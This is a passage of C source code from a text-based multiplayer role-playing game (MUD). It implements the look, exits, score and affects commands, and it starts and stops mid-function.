	REMOVE_BIT(ch->imm_flags,IMM_SUMMON);
      }
      else
      {
	send_to_char("\n\r{WYou are now immune to summoning.{x\n\r",ch);
	SET_BIT(ch->imm_flags,IMM_SUMMON);
      }
    }
    else
    {
      if (IS_SET(ch->pact,PLR_NOSUMMON))
      {
        send_to_char("\n\r{WYou are no longer immune to summon.{x\n\r",ch);
        REMOVE_BIT(ch->pact,PLR_NOSUMMON);
      }
      else
      {
        send_to_char("\n\r{WYou are now immune to summoning.{x\n\r",ch);
        SET_BIT(ch->pact,PLR_NOSUMMON);
      }
    }
}

void do_look( CHAR_DATA *ch, char *argument )
{
    char buf  [MAX_STRING_LENGTH];
    char arg1 [MAX_INPUT_LENGTH];
    char arg2 [MAX_INPUT_LENGTH];
    char arg3 [MAX_INPUT_LENGTH];
    EXIT_DATA *pexit;
    CHAR_DATA *victim;
    OBJ_DATA *obj;
    char *pdesc;
    int door;
    int number,count;

    send_to_char("\n\r",ch);

    if ( ch->desc == NULL )
	return;

    if ( ch->position < POS_SLEEPING )
    {
	send_to_char( "You can't see anything but stars!\n\r", ch );
	return;
    }

    if ( ch->position == POS_SLEEPING )
    {
	send_to_char( "You can't see anything, you're sleeping!\n\r", ch );
	return;
    }

if (!IS_NPC(ch))
   {
  if (IS_SET(ch->comm, COMM_AFK))
    {
     send_to_char("AFK mode removed due to PLAYER INPUT. Type 'replay' to see tells.\n\r",ch);
      REMOVE_BIT(ch->comm,COMM_AFK);
    }
   }

    if ( !check_blind( ch ) )
	return;

    if ( !IS_NPC(ch)
    &&   !IS_SET(ch->pact, PLR_HOLYLIGHT)
    &&   room_is_dark( ch->in_room ) )
    {
	send_to_char( "\n\r{DIt is pitch black {w... {x\n\r", ch );
	show_char_to_char( ch->in_room->people, ch );
	return;
    }

    argument = one_argument( argument, arg1 );
    argument = one_argument( argument, arg2 );
    number = number_argument(arg1,arg3);
    count = 0;

    if ( arg1[0] == '\0' || !str_cmp( arg1, "auto" ) )
    {
	/* 'look' or 'look auto' */
	send_to_char( ch->in_room->name, ch );

	if ( (IS_IMMORTAL(ch) && (IS_NPC(ch) || IS_SET(ch->pact,PLR_HOLYLIGHT)))
	||   IS_BUILDER(ch, ch->in_room->area) )
	{
	    sprintf(buf," {c[{yRoom %d{c]{x",ch->in_room->vnum);
	    send_to_char(buf,ch);
	}

	send_to_char( "\n\r", ch );

	if ( arg1[0] == '\0'
	|| ( !IS_NPC(ch) && !IS_SET(ch->comm, COMM_BRIEF) ) )
	{
	    send_to_char( "  ",ch);
	    send_to_char( ch->in_room->description, ch );
	}

        if ( !IS_NPC(ch) && IS_SET(ch->pact, PLR_AUTOEXIT) )
	{
	    send_to_char("{y\n\r",ch);
            do_function(ch, &do_exits, "auto" );
	}

	show_list_to_char( ch->in_room->contents, ch, FALSE, FALSE );
	show_char_to_char( ch->in_room->people,   ch );
	return;
    }

    if ( !str_cmp( arg1, "i" ) || !str_cmp(arg1, "in")  || !str_cmp(arg1,"on"))
    {
	/* 'look in' */
	if ( arg2[0] == '\0' )
	{
	    send_to_char( "Look in what?\n\r", ch );
	    return;
	}

	if ( ( obj = get_obj_here( ch, arg2 ) ) == NULL )
	{
	    send_to_char( "You do not see that here.\n\r", ch );
	    return;
	}

	switch ( obj->item_type )
	{
	default:
	    send_to_char( "That is not a container.\n\r", ch );
	    break;

	case ITEM_DRINK_CON:
	    if ( obj->value[1] <= 0 )
	    {
		send_to_char( "It is empty.\n\r", ch );
		break;
	    }

	    sprintf( buf, "It's %sfilled with  a %s liquid.\n\r",
		obj->value[1] <     obj->value[0] / 4
		    ? "less than half-" :
		obj->value[1] < 3 * obj->value[0] / 4
		    ? "about half-"     : "more than half-",
		liq_table[obj->value[2]].liq_color
		);

	    send_to_char( buf, ch );
	    break;

	case ITEM_CONTAINER:
	case ITEM_CORPSE_NPC:
	case ITEM_CORPSE_PC:
	    if ( IS_SET(obj->value[1], CONT_CLOSED) )
	    {
		send_to_char( "It is closed.\n\r", ch );
		break;
	    }

	    act( "$p holds:", ch, obj, NULL, TO_CHAR );
	    show_list_to_char( obj->contains, ch, TRUE, TRUE );
	    break;
	}
	return;
    }

    if ( ( victim = get_char_room( ch, arg1 ) ) != NULL )
    {
	show_char_to_char_1( victim, ch );
	return;
    }

    for ( obj = ch->carrying; obj != NULL; obj = obj->next_content )
    {
	if ( can_see_obj( ch, obj ) )
	{  /* player can see object */
	    pdesc = get_extra_descr( arg3, obj->extra_descr );
	    if ( pdesc != NULL )
		{
	    	if (++count == number)
	    	{
		    send_to_char( pdesc, ch );
		    return;
	    	}
	    	else continue;
		}

 	    pdesc = get_extra_descr( arg3, obj->pIndexData->extra_descr );
 	    if ( pdesc != NULL )
		{
 	    	if (++count == number)
 	    	{	
		    send_to_char( pdesc, ch );
		    return;
	     	}
			else continue;
		}

	    if ( is_name( arg3, obj->name ) )
	    	if (++count == number)
	    	{
	    	    send_to_char( obj->description, ch );
	    	    send_to_char( "\n\r",ch);
		    return;
		  }
	  }
    }

    for ( obj = ch->in_room->contents; obj != NULL; obj = obj->next_content )
    {
	if ( can_see_obj( ch, obj ) )
	{
	    pdesc = get_extra_descr( arg3, obj->extra_descr );
	    if ( pdesc != NULL )
	    	if (++count == number)
	    	{
		    send_to_char( pdesc, ch );
		    return;
	    	}

	    pdesc = get_extra_descr( arg3, obj->pIndexData->extra_descr );
	    if ( pdesc != NULL )
	    	if (++count == number)
	    	{
		    send_to_char( pdesc, ch );
		    return;
	    	}

	    if ( is_name( arg3, obj->name ) )
		if (++count == number)
		{
		    send_to_char( obj->description, ch );
		    send_to_char("\n\r",ch);
		    return;
		}
	}
    }

    pdesc = get_extra_descr(arg3,ch->in_room->extra_descr);
    if (pdesc != NULL)
    {
	if (++count == number)
	{
	    send_to_char(pdesc,ch);
	    return;
	}
    }
    
    if (count > 0 && count != number)
    {
    	if (count == 1)
    	    sprintf(buf,"You only see one %s here.\n\r",arg3);
    	else
    	    sprintf(buf,"You only see %d of those here.\n\r",count);
    	
    	send_to_char(buf,ch);
    	return;
    }

     if ( !str_cmp(arg1, "n") || !str_cmp( arg1, "north"    )) door = 0;
else if ( !str_cmp(arg1, "e") || !str_cmp( arg1, "east"     )) door = 1;
else if ( !str_cmp(arg1, "s") || !str_cmp( arg1, "south"    )) door = 2;
else if ( !str_cmp(arg1, "w") || !str_cmp( arg1, "west"     )) door = 3;
else if ( !str_cmp(arg1, "u") || !str_cmp( arg1, "up"       )) door = 4;
else if ( !str_cmp(arg1, "d") || !str_cmp( arg1, "down"     )) door = 5;
else if ( !str_cmp(arg1, "ne") || !str_cmp(arg1, "northeast" )) door = 6;
else if ( !str_cmp(arg1, "se") || !str_cmp(arg1, "southeast" )) door = 7;
else if ( !str_cmp(arg1, "sw") || !str_cmp(arg1, "southwest" )) door = 8;
else if ( !str_cmp(arg1, "nw") || !str_cmp(arg1, "northwest" )) door = 9;
else
    {
	send_to_char( "You do not see that here.\n\r", ch );
	return;
    }

    /* 'look direction' */
    if ( ( pexit = ch->in_room->exit[door] ) == NULL )
    {
	send_to_char( "Nothing special there.\n\r", ch );
	return;
    }

    if ( pexit->description != NULL && pexit->description[0] != '\0' )
	send_to_char( pexit->description, ch );
    else
	send_to_char( "Nothing special there.\n\r", ch );

    if ( pexit->keyword    != NULL
    &&   pexit->keyword[0] != '\0'
    &&   pexit->keyword[0] != ' ' )
    {
	if ( IS_SET(pexit->exit_info, EX_CLOSED) )
	{
	    act( "The $d is closed.", ch, NULL, pexit->keyword, TO_CHAR );
	}
	else if ( IS_SET(pexit->exit_info, EX_ISDOOR) )
	{
	    act( "The $d is open.",   ch, NULL, pexit->keyword, TO_CHAR );
	}
    }

    return;
}

/* RT added back for the hell of it */
void do_read (CHAR_DATA *ch, char *argument )
{
    do_function(ch, &do_look, argument);
}

/*
void do_examine( CHAR_DATA *ch, char *argument )
{
    char buf[MAX_STRING_LENGTH];
    char arg[MAX_INPUT_LENGTH];
    OBJ_DATA *obj;

    one_argument( argument, arg );

    if ( arg[0] == '\0' )
    {
	send_to_char( "Examine what?\n\r", ch );
	return;
    }

    do_function(ch, &do_look, arg );

    if ( ( obj = get_obj_here( ch, arg ) ) != NULL )
    {
	switch ( obj->item_type )
	{
	default:
	    break;
	
	case ITEM_MONEY:
	    if (obj->value[0] == 0)
	    {
	        if (obj->value[1] == 0)
		    sprintf(buf,"Odd...there's no coins in the pile.\n\r");
		else if (obj->value[1] == 1)
		    sprintf(buf,"Wow. One gold coin.\n\r");
		else
		    sprintf(buf,"There are %d gold coins in the pile.\n\r",
			obj->value[1]);
	    }
	    else if (obj->value[1] == 0)
	    {
		if (obj->value[0] == 1)
		    sprintf(buf,"Wow. One silver coin.\n\r");
		else
		    sprintf(buf,"There are %d silver coins in the pile.\n\r",
			obj->value[0]);
	    }
	    else
		sprintf(buf,
		    "There are %d gold and %d silver coins in the pile.\n\r",
		    obj->value[1],obj->value[0]);
	    send_to_char(buf,ch);
	    break;

	case ITEM_DRINK_CON:
	case ITEM_CONTAINER:
	case ITEM_CORPSE_NPC:
	case ITEM_CORPSE_PC:
	    sprintf(buf,"in %s",argument);
	    do_function(ch, &do_look, buf );
	}
    }

    return;
}

*/

/*
 * Thanks to Zrin for auto-exit part.
 */
void do_exits( CHAR_DATA *ch, char *argument )
{
    extern char * const dir_name[];
    char buf[MAX_STRING_LENGTH];
    EXIT_DATA *pexit;
    bool found;
    bool fAuto;
    int door;

    fAuto  = !str_cmp( argument, "auto" );

    if ( !check_blind( ch ) )
	return;

    if (fAuto)
	sprintf(buf,"{c[{yExits{c:{x");
    else if (IS_IMMORTAL(ch))
	sprintf(buf,"{cExits from room {y%d{c:{x\n\r",ch->in_room->vnum);
    else
	sprintf(buf,"{cObvious exits:{x\n\r");

    found = FALSE;
    for ( door = 0; door <= 9; door++ )
    {
	if ( ( pexit = ch->in_room->exit[door] ) != NULL
	&&   pexit->u1.to_room != NULL
    &&   (IS_IMMORTAL(ch)
	||   (can_see_room(ch,pexit->u1.to_room) 
	&&   !IS_SET(pexit->exit_info, EX_CLOSED))) )
	{
	    found = TRUE;
	    if ( fAuto )
	    {
		strcat( buf, " " );
		strcat( buf, dir_name[door] );
	    }
	    else
	    {
		sprintf( buf + strlen(buf), "%-5s - %s",
		    capitalize( dir_name[door] ),
		    room_is_dark( pexit->u1.to_room )
			?  "Too dark to tell"
			: pexit->u1.to_room->name
		    );
		if (IS_IMMORTAL(ch))
		    sprintf(buf + strlen(buf), 
			" {c({yroom %d{c){x\n\r",pexit->u1.to_room->vnum);
		else
		    sprintf(buf + strlen(buf), "\n\r");
	    }
	}
    }

    if ( !found )
	strcat( buf, fAuto ? " none" : "None.\n\r" );

    if ( fAuto )
	strcat( buf, "{c]{x\n\r" );

    send_to_char( buf, ch );
    return;
}



char * swapout_score(const struct score_type * table, char * scoreData, char * varName, char * varData)
{
    int     i=0;
    char *  newVarData=0;
    char *  newScoreData=0;
    char *  spacer=0;

    for(i=0;table[i].varName && strcmp(table[i].varName, varName);i++)
    ;
    
    if(!table[i].varName)
        return scoreData;
    
    if(!varData)
    {
        newVarData = strchrrepeat(' ', table[i].maxVarLength);
    }
    else
    {
        if(table[i].maxVarLength>strlen(varData))
        {
            spacer = strchrrepeat(' ', table[i].maxVarLength-strlen(varData));
            
            if(table[i].padRight==TRUE)
            {
                newVarData = strdup(varData);
                newVarData = strappend(newVarData, spacer);
            }
            else
            {
                newVarData = strdup(spacer);
                newVarData = strappend(newVarData, varData);
            }
            
            spacer = strfree(spacer);
        }
        else if(table[i].maxVarLength<strlen(varData))
        {
            newVarData = strndup(varData, table[i].maxVarLength);
        }
        else
            newVarData = strdup(varData);
    }
    
    newScoreData = strstrrep(scoreData, varName, newVarData);
    
    newVarData = strfree(newVarData);
    
    return newScoreData;
}

char * swapout_score_num(const struct score_type * table, char * scoreData, char * varName, int varData)
{
    char    buf[MAX_STRING_LENGTH];
    
    sprintf(buf, "%d", varData);
    
    return swapout_score(table, scoreData, varName, buf);
}

// Explorer/Killer
char * swapout_score_percentages(CHAR_DATA * ch, const struct score_type * table, char * score)
{
    AREA_DATA *     pArea;
    char **         ar=0;          
    unsigned long   totalMobsInArea=0, killedInThisArea=0, totalMobsKilled=0;
    unsigned long   totalRoomsInArea=0, exploredInThisArea=0, totalRoomsExplored=0;
    unsigned long   totalObjectsInArea=0, foundInThisArea=0, totalObjectsFound=0;

    if(!ch || !ch->pcdata)
        return score;

    for(pArea=area_first;pArea;pArea=pArea->next)
    {
        for(ar=pArea->mobVnums,totalMobsInArea=array_len(pArea->mobVnums),killedInThisArea=0;ar && *ar;ar++)
        {
            if(array_find(ch->pcdata->killed, *ar)!=-1)
                killedInThisArea++;
        }
        
        for(ar=pArea->roomVnums,totalRoomsInArea=array_len(pArea->roomVnums),exploredInThisArea=0;ar && *ar;ar++)
        {
            if(array_find(ch->pcdata->explored, *ar)!=-1)
                exploredInThisArea++;
        }
        
        for(ar=pArea->objectVnums,totalObjectsInArea=array_len(pArea->objectVnums),foundInThisArea=0;ar && *ar;ar++)
        {
            if(array_find(ch->pcdata->objectsFound, *ar)!=-1)
                foundInThisArea++;
        }
        
        if(totalMobsInArea==0 && totalRoomsInArea==0 && totalObjectsInArea==0)
            continue;
        
        totalMobsKilled+=killedInThisArea;
        totalRoomsExplored+=exploredInThisArea;
        totalObjectsFound+=foundInThisArea;
     }
    
    score = swapout_score_num(table, score, "$percentkilledcur", totalMobsKilled);
    score = swapout_score_num(table, score, "$percentkilledmax", gTotalMobs);
    score = swapout_score_num(table, score, "$percentkilledpercent", ((totalMobsKilled*100)/gTotalMobs));
    score = swapout_score_num(table, score, "$percentexploredcur", totalRoomsExplored);
    score = swapout_score_num(table, score, "$percentexploredmax", gTotalRooms);
    score = swapout_score_num(table, score, "$percentexploredpercent", ((totalRoomsExplored*100)/gTotalRooms));
    score = swapout_score_num(table, score, "$percentfoundcur", totalObjectsFound);
    score = swapout_score_num(table, score, "$percentfoundmax", gTotalObjects);
    score = swapout_score_num(table, score, "$percentfoundpercent", ((totalObjectsFound*100)/gTotalObjects));

    return score;
}

char * swapout_score_affects(CHAR_DATA * ch, const struct score_type * table, char * score)
{
    AFFECT_DATA *   paf, *paf_last = NULL;
    char            buf[MAX_STRING_LENGTH];
    
    if(ch->affected)
    {
        score = swapout_score(table, score, "$affects", "You are affected by the following spells:");

    	for(paf=ch->affected;paf;paf=paf->next)
    	{
    	    if(paf_last && paf->type==paf_last->type)
    	    {
    		  if(ch->level >= 20)
    		      sprintf(buf, "{B                                           ");
    		  else
    		      continue;
    	    }
    	    else if(paf->type>0)
    	    {
    	    	sprintf(buf, "{B                     SPELL{w: {C%-15.15s{x",capitalize(skill_table[paf->type].name));
    	    }
    	    
    	    score = strappend(score, buf);
    
    	    if(ch->level >= 20)
            {
                sprintf(buf, "{w: {BMODs {C%-8.8s {Bby {C%5d {x", capitalize(affect_loc_name(paf->location)), paf->modifier);
                score = strappend(score, buf);
                
                if(paf->duration == -1)
                    sprintf(buf, "{RETERNALLY{x");
                else
                    sprintf(buf, "{Bfor {C%-3d {BHRs{x", paf->duration);
                score = strappend(score, buf);
            }
            
            score = strappend(score, "\n\r");
            paf_last = paf;
    	}
    }
    else 
        score = swapout_score(table, score, "$affects", "You are not affected by any spells.");
    
    return score;
}


void do_score(CHAR_DATA * ch, char * argument)
{
    char *                      score=0;
    CLAN_DATA *                 pClan=0;
    const struct score_type *   table;

    if(IS_NPC(ch) || !ch->pcdata)
    {
        send_to_char("No score for filthy beasts!\n\r", ch);
        return;
    }
    
    if(IS_LEGEND(ch))
    {
        if(ch->pcdata->casterScore)
        {
            score = strdup(gCasterScoreLegend);
            table = caster_score_table;
        }
        else
        {
            score = strdup(gWarriorScoreLegend);
            table = warrior_score_table;
        }
    }
    else
    {    
        if(!strcmp(class_table[ch->class].name, "Warrior") ||
           !strcmp(class_table[ch->class].name, "Paladin") ||
           !strcmp(class_table[ch->class].name, "AntiPaladin") ||
           !strcmp(class_table[ch->class].name, "Thief") ||
           !strcmp(class_table[ch->class].name, "Ranger") ||
           !strcmp(class_table[ch->class].name, "Assassin"))
        {
            score = strdup(gWarriorScore);
            table = warrior_score_table;
        }
        else
        {
            score = strdup(gCasterScore);
            table = caster_score_table;
        }
    }
                 
    pClan = get_clan_index(ch->ctimp_clan);
    
    score = swapout_score(table, score, "$name", ch->name);
    score = swapout_score(table, score, "$clan", pClan ? capitalize(pClan->name) : 0);
    score = swapout_score_num(table, score, "$hours", ((ch->played + (int) (current_time - ch->logon) ) /3600));
    score = swapout_score_num(table, score, "$level", ch->level);
    score = swapout_score_num(table, score, "$trains", ch->train);
    score = swapout_score_num(table, score, "$age", get_age(ch));
    score = swapout_score(table, score, "$sex", ch->sex == 0 ? "SEXLESS" : ch->sex == 1 ? "MALE" : "FEMALE");
    score = swapout_score_num(table, score, "$align", ch->alignment);
    if(IS_LEGEND(ch))
    {
        score = swapout_score(table, score, "$legend", legend_table[ch->pcdata->legend].name);
    }
    else
    {
        score = swapout_score(table, score, "$race", (ch->race == RACE_LIZARDMAN && ch->sex == SEX_FEMALE) ? "LizardWoman" : race_table[ch->race].name);
        score = swapout_score(table, score, "$class", class_table[ch->class].name);
    }
    score = swapout_score_num(table, score, "$str", get_curr_stat(ch, STAT_STR));
    score = swapout_score_num(table, score, "$int", get_curr_stat(ch, STAT_INT));
    score = swapout_score_num(table, score, "$wis", get_curr_stat(ch, STAT_WIS));
    score = swapout_score_num(table, score, "$dex", get_curr_stat(ch, STAT_DEX));
    score = swapout_score_num(table, score, "$con", get_curr_stat(ch, STAT_CON));
    score = swapout_score_num(table, score, "$practices", ch->practice);
    score = swapout_score_num(table, score, "$experience", ch->exp);
    score = swapout_score_num(table, score, "$exptolevel", ((ch->level + 1) * exp_per_level(ch, ch->pcdata->points) - ch->exp));
    score = swapout_score_num(table, score, "$hitpt", ch->hit);
    score = swapout_score_num(table, score, "$mana", ch->mana);
    score = swapout_score_num(table, score, "$move", ch->move);
    score = swapout_score_num(table, score, "$wimp", ch->wimpy);
    score = swapout_score_num(table, score, "$maxhit", ch->max_hit);
    score = swapout_score_num(table, score, "$maxmana", ch->max_mana);
    score = swapout_score_num(table, score, "$maxmove", ch->max_move);
    score = swapout_score_num(table, score, "$hitroll", GET_HITROLL(ch));
    score = swapout_score_num(table, score, "$damroll", GET_DAMROLL(ch));
    score = swapout_score_num(table, score, "$items", ch->carry_number);
    score = swapout_score_num(table, score, "$maxitems", can_carry_n(ch));
    score = swapout_score_num(table, score, "$weight", get_carry_weight(ch));
    score = swapout_score_num(table, score, "$maxweight", can_carry_w(ch));
    score = swapout_score_num(table, score, "$pierce", GET_AC(ch, AC_PIERCE));
    score = swapout_score_num(table, score, "$bash", GET_AC(ch, AC_BASH));
    score = swapout_score_num(table, score, "$slash", GET_AC(ch, AC_SLASH));
    score = swapout_score_num(table, score, "$magic", GET_AC(ch, AC_EXOTIC));
    score = swapout_score_num(table, score, "$questpoints", ch->questpoints);
    score = swapout_score_num(table, score, "$questtime", ch->countdown);
    score = swapout_score_num(table, score, "$gold", ch->gold);
    score = swapout_score_num(table, score, "$silver", ch->silver);
    score = swapout_score_num(table, score, "$bankgold", ch->pcdata->gold_bank);
    score = swapout_score_num(table, score, "$banksilver", ch->pcdata->silver_bank);
    score = swapout_score_num(table, score, "$pkillsabove", ch->pcdata->member ? ch->pcdata->member->pks_up : 0);
    score = swapout_score_num(table, score, "$pkillsbelow", ch->pcdata->member ? ch->pcdata->member->pks_dwn : 0);
    score = swapout_score_num(table, score, "$pdeathsabove", ch->pcdata->member ? ch->pcdata->member->pkd_up : 0);
    score = swapout_score_num(table, score, "$pdeathsbelow", ch->pcdata->member ? ch->pcdata->member->pkd_dwn : 0);

    score = swapout_score_percentages(ch, table, score);
    
    if(IS_SET(ch->comm, COMM_SHOW_AFFECTS))
        score = swapout_score_affects(ch, table, score);
    else
        score = swapout_score(table, score, "$affects", 0);

    send_to_char(score, ch);
    score = strfree(score);
}


void do_scoreold( CHAR_DATA *ch, char *argument )
{ 
  char buf[MAX_STRING_LENGTH];
  CLAN_DATA *pClan;  

   if (!IS_NPC (ch))
     {

sprintf( buf,"\n\r{cLevel{w: {C%-12d {cSTR{w: {W%2d     {cAge{w: {C%-8d{x ",
ch->level,get_curr_stat(ch,STAT_STR),get_age(ch));
send_to_char( buf, ch );

    if ( !IS_NPC( ch ) )
     {
    if (ch->pcdata->condition[COND_DRUNK]   > 10 )
	send_to_char( "{MYou are drunk.{x\n\r",   ch );
    else
     send_to_char ( "\n\r", ch);
     }
    else
     send_to_char ( "\n\r", ch);

sprintf( buf," {cRace{w: {C%-12s {cINT{w: {W%2d     {cSex{w: {C%-8s{x ",
(ch->race == RACE_LIZARDMAN && ch->sex == SEX_FEMALE) ? "LizardWoman" :
race_table[ch->race].name,get_curr_stat(ch,STAT_INT), 
ch->sex == 0 ? "SEXLESS" : ch->sex == 1 ? "MALE" : "FEMALE");
send_to_char( buf, ch );

    if ( !IS_NPC( ch ) )
     {
    if (ch->pcdata->condition[COND_THIRST] ==  0 )
	send_to_char( "{BYou are thirsty.{x\n\r", ch );
    else
     send_to_char ( "\n\r", ch);
     }
    else
     send_to_char ( "\n\r", ch);

sprintf( buf,"{cClass{w: {C%-12s {cWIS{w: {W%2d                  {x ", 
IS_NPC(ch) ? "mobile" :
class_table[ch->class].name,get_curr_stat(ch,STAT_WIS));
send_to_char( buf, ch );

    if ( !IS_NPC( ch ) )
     {
    if (ch->pcdata->condition[COND_HUNGER]   ==  0 )
	send_to_char( "{RYou are hungry.{x\n\r",  ch );
    else
     send_to_char ( "\n\r", ch);
     }
    else
     send_to_char ( "\n\r", ch);

sprintf( buf,"{cAlign{w: {C%-12s {cDEX{w: {W%2d  {cTrains{w: {C%-3d{x\n\r",

( (ch->alignment >= 500) ? "GOOD" : (ch->alignment <= -500) ? "EVIL" : 
(ch->alignment <= 499 && ch->alignment >= -499) ? "NEUTRAL" : "ALIGN_BUG"),
get_curr_stat(ch,STAT_DEX), ch->train);
send_to_char( buf, ch );

sprintf( buf,"{cHours{w: {C%-12d {cCON{w: {W%2d   {cPracs{w: {C%-8d{x\n\r",
((ch->played + (int) (current_time - ch->logon) ) /3600),get_curr_stat(ch,STAT_CON),
ch->practice);
send_to_char( buf, ch );

if (!IS_NPC(ch) && (ch->pcdata->spouse > 0))
  {
   sprintf( buf,"{cSpous{w: {G%-10s{x   ",capitalize(ch->pcdata->spouse));
   send_to_char( buf, ch );

   if (IS_IMP(ch))
     {
      pClan = get_clan_index(ch->ctimp_clan);
       sprintf( buf,"{cCTImp{w: {G%-15s{x\n\r\n\r",capitalize(pClan->name));
      send_to_char( buf, ch );
     }
   else
    send_to_char ( "\n\r\n\r", ch);
  }
else
 send_to_char ( "\n\r", ch);

sprintf(buf, "{cHitPt{w: {W%-5d{c({C%5d{c)  {cExperience{w: {C%-8d{x\n\r",
ch->hit,ch->max_hit,ch->exp);
send_to_char( buf, ch );

sprintf(buf," {cMana{w: {W%-5d{c({C%5d{c)  {RExp to Lvl{w: {C%-8d{x\n\r",ch->mana, ch->max_mana,
((ch->level + 1) * exp_per_level(ch,ch->pcdata->points) - ch->exp));
send_to_char( buf, ch );

sprintf(buf," {cMove{w: {W%-5d{c({C%5d{c)  {cQuest Pnts{w: {C%-8d{x\n\r",
ch->move, ch->max_move,ch->questpoints);
send_to_char( buf, ch );

sprintf(buf,"\n\r{cPierce{w: {C%-6d    {CHIT{croll{w: {C%-5d{x\n\r",
GET_AC(ch,AC_PIERCE),GET_HITROLL( ch ));
send_to_char( buf, ch );

sprintf(buf,"  {cBash{w: {C%-6d    {CDAM{croll{w: {C%-5d{x\n\r",
GET_AC(ch,AC_BASH),GET_DAMROLL( ch ));
send_to_char( buf, ch );

sprintf(buf," {cSlash{w: {C%-6d  {x\n\r",GET_AC(ch,AC_SLASH));
send_to_char( buf, ch );

sprintf(buf," {cMagic{w: {C%-6d       {cWimp{w: {C%-6d {x\n\r",
GET_AC(ch,AC_EXOTIC),ch->wimpy);
send_to_char( buf, ch );

// wizzle

    if ( !IS_NPC( ch ) )
      {
/*
      sprintf( buf, 
"{cCURRENCY{w: {COn Character{w: {YGold{w: {Y%-7ld   {WSilver{w: {W%-7ld{x\n\r",ch->gold, ch->silver);
      send_to_char( buf, ch );

sprintf( buf, 
"            {COn Deposit{w: {YGold{w: {Y%-7ld   {WSilver{w: {W%-7ld{x\n\r",
                    ch->pcdata->gold_bank, ch->pcdata->silver_bank );
      send_to_char( buf, ch );
*/

       if (IS_SET(ch->comm,COMM_SHOW_ACCOUNT))
         {
          do_account(ch," ");
         }
      }
    else
      {
     sprintf( buf,
	"Gold: %ld   Silver: %ld\n\r",ch->gold,ch->silver);
	 send_to_char( buf, ch );
      }

sprintf( buf,
"\n\r{cYou have {C%d {cof {C%d {citems in your Inventory{x\n\r", ch->carry_number, can_carry_n(ch) );
         send_to_char( buf, ch );

sprintf( buf,"{cYou are carrying {C%ld {cof {C%d {ctotal pounds{x\n\r",get_carry_weight(ch), can_carry_w(ch));
         send_to_char( buf, ch );

    // Explorer/Killer Percentages
    if(valid_explorer_killer(ch))
        do_score_section(ch);

    if ( IS_IMMORTAL(ch))
    {
      send_to_char("{cHoly Light:{x ",ch);
      if (IS_SET(ch->pact,PLR_HOLYLIGHT))
        send_to_char("{WON{x",ch);
      else
        send_to_char("{dOFF{x",ch);

      if (ch->invis_level)
      {
        sprintf( buf, "  {cInvis Level{w: {C%d",ch->invis_level);
        send_to_char(buf,ch);
      }

      if (ch->incog_level)
      {
	sprintf(buf,"  {cIncog Level{w: {C%d",ch->incog_level);
	send_to_char(buf,ch);
      }
      send_to_char("{x\n\r",ch);
    }
   else  
    send_to_char ( "\n\r", ch);

    
// For when we put PKill Info in
    if ( !IS_NPC( ch ) && ch->pcdata->member )
      {
        if (IS_IMMORTAL(ch))
            send_to_char ( "\n\r", ch);

      sprintf( buf, 
"{cPKills{w: {CAbove your lvl{w: {G%d  {c/ {CBelow your lvl{w: {G%d{x\n\r",
                    ch->pcdata->member->pks_up, ch->pcdata->member->pks_dwn );
      send_to_char( buf, ch );
sprintf( buf, 
"{cPDeths{w: {CAbove your lvl{w: {R%d  {c/ {CBelow your lvl{w: {R%d{x\n\r",
                    ch->pcdata->member->pkd_up, ch->pcdata->member->pkd_dwn );
      send_to_char( buf, ch );
      }

  if (IS_SET(ch->comm,COMM_SHOW_AFFECTS))
    	do_affects(ch,"");
  }
else
 if (IS_NPC(ch))
  {
sprintf( buf, "\n\r Name: %s   VNum: ( %d )\n\r",ch->name,
ch->pIndexData->vnum);
send_to_char( buf, ch );

sprintf( buf,"Level: %-12d STR: %2d(%2d)\n\r",
ch->level,get_curr_stat(ch,STAT_STR),ch->perm_stat[STAT_STR]);
send_to_char( buf, ch );

sprintf( buf," Race: %-12s INT: %2d(%2d)\n\r",
race_table[ch->race].name,get_curr_stat(ch,STAT_INT),ch->perm_stat[STAT_INT]);
send_to_char( buf, ch );

sprintf( buf,"                    WIS: %2d(%2d)\n\r", 
get_curr_stat(ch,STAT_WIS), ch->perm_stat[STAT_WIS]);
send_to_char( buf, ch );

sprintf( buf,"Align: %-12s DEX: %2d(%2d)\n\r",
( (ch->alignment >= 500) ? "GOOD" : (ch->alignment <= -500) ? "EVIL" : 
(ch->alignment <= 499 && ch->alignment >= -499) ? "NEUTRAL" : "ALIGN_BUG"),
get_curr_stat(ch,STAT_DEX),ch->perm_stat[STAT_DEX]);
send_to_char( buf, ch );

sprintf( buf,"  Sex: %-8s     CON: %2d(%2d)\n\r",
(ch->sex == 0 ? "SEXLESS" : ch->sex == 1 ? "MALE" : "FEMALE"),
get_curr_stat(ch,STAT_CON),ch->perm_stat[STAT_CON]);
send_to_char( buf, ch );

sprintf(buf, "\n\rHitPt: %-5d(%5d)   HITroll: %-5d \n\r",
ch->hit,ch->max_hit, GET_HITROLL( ch ));
send_to_char( buf, ch );

sprintf(buf," Mana: %-5d(%5d)   DAMroll: %-5d \n\r",
ch->mana, ch->max_mana,GET_DAMROLL( ch ));
send_to_char( buf, ch );

sprintf(buf," Move: %-5d(%5d)\n\r",ch->move, ch->max_move);
send_to_char( buf, ch );

sprintf(buf,"\n\rPierce: %-6d",
GET_AC(ch,AC_PIERCE));
send_to_char( buf, ch );

sprintf(buf," Bash: %-6d",GET_AC(ch,AC_BASH));
send_to_char( buf, ch );

sprintf(buf," Slash: %-6d",GET_AC(ch,AC_SLASH));
send_to_char( buf, ch );

sprintf(buf," Magic: %-6d\n\r\n\r",
GET_AC(ch,AC_EXOTIC));
send_to_char( buf, ch );

     sprintf( buf,
"Gold: %ld   Silver: %ld\n\r",ch->gold,ch->silver);
	 send_to_char( buf, ch );

  if (IS_SET(ch->comm,COMM_SHOW_AFFECTS))
    	do_affects(ch,"");
  }
}

void do_affects(CHAR_DATA *ch, char *argument )
{
    AFFECT_DATA *paf, *paf_last = NULL;
    char buf[MAX_STRING_LENGTH];
    
    if ( ch->affected != NULL )
    {
	send_to_char( "\n\r{BYou are affected by the following spells{w:{x\n\r", ch);
	for ( paf = ch->affected; paf != NULL; paf = paf->next )
	{
	    if (paf_last != NULL && paf->type == paf_last->type)
		if (ch->level >= 20)
		    sprintf( buf, "                      ");
		else
		    continue;
	    else if(paf->type>0)
	    	sprintf( buf, "{BSPELL{w: {C%-15.15s{x",capitalize(skill_table[paf->type].name) );

	    send_to_char( buf, ch );

	    if ( ch->level >= 20)
             {
sprintf(buf,"{w: {BMODs {C%-8.8s {Bby {C%5d {x",capitalize(affect_loc_name(paf->location)), paf->modifier);
 send_to_char( buf, ch );
  if ( paf->duration == -1 )
    sprintf( buf, "{RETERNALLY{x" );
   else
